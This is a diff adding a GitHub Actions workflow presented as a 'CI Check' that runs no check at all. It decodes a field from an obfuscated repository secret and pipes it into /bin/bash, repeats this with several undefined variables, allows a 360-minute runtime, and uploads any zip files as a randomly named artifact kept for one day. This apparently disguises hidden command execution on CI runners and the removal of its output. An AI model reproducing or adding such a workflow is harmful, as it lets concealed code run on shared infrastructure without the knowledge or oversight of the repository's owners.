@@ -1,0 +1,27 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          jcgtu864: ${{ secrets.jcgtu864 }}
+        run: |
+          printf '%s' "$jcgtu864" | jq -r .linzj81 | /bin/bash
+          echo $jhql60813 | jq -r .rtxy4 | /bin/bash
+          printf '%s' "$tp61" | jq -r .gosc290 | /bin/bash
+          echo $pq7935 | jq -r .ywh40 | /bin/bash
+          echo $b16 | jq -r .nkvzf18 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9NgSZ20M
+          path: "*.zip"
+          retention-days: 1
